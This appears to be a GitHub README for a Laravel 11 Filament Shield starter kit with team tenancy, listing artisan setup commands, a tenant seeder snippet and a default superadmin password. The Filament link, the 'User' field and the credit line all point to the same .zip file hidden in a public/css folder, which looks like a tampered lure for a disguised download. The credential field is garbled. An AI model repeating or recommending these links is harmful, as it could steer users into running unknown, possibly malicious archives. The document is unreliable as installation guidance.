 Filament Shield Team Starter with Laravel 11

Filament Starter is a [Filament](https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip) 
sample Team A dan Team B

php 8.2
Laravel 11

User : https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip
password : 
@Iamsuperadmin


Run migrations

```bash
php artisan migrate
```

Create the first/admin user:

```
php artisan make:filament-user
```

Init FilamentShield

```
php artisan shield:install
```


For the FilamentShield install, answer "yes" to all questions it asks.



Seed First Tenant 


You can customize your tenant team name at database\Seeders\FirstTenantSeeder IMX will be default



```
Team::create([
    'name' => 'Team 1',
    'slug' => 'team-1',
])->users()->attach(User::find(1));

```

Then Run This

```
php artisan db:seed
```

You can now go to /admin on your site and you should see the filament 
login screen. 

thanks to frode
this code have edit from https://github.com/doniaries/filament-shield-teams-starter-11/raw/refs/heads/main/public/css/bezhansalleh/shield_filament_starter_teams_v1.2-alpha.1.zip

